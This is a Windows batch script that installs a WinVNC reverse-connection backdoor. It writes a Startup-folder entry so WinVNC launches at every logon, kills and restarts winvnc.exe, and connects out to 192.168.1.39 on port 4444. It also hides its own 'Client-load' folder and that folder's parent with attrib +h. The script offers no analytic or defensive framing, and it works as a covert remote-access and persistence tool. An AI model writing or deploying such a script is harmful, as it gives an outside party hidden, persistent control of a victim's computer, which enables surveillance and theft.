@echo off

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%~dp0"
  echo call "%~dp0run_winvnc.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  @echo off
taskkill /im winvnc.exe /f
timeout /t 1 >nul
start winvnc.exe -run
timeout /t 1 >nul
winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
  echo startup_winvnc.bat created successfully in Startup folder.
) else (
  echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  echo run_winvnc.bat created successfully in current directory.
) else (
  echo Failed to create run_winvnc.bat in current directory.
)

REM Hide the extracted Client-load folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Start winvnc.exe and wait for permissions
start /min "" winvnc.exe -run

timeout /t 7 >nul

call "%script_dir%run_winvnc.bat"
timeout /t 2 >nul
call "%script_dir%run_winvnc.bat"
REM End of main.bat
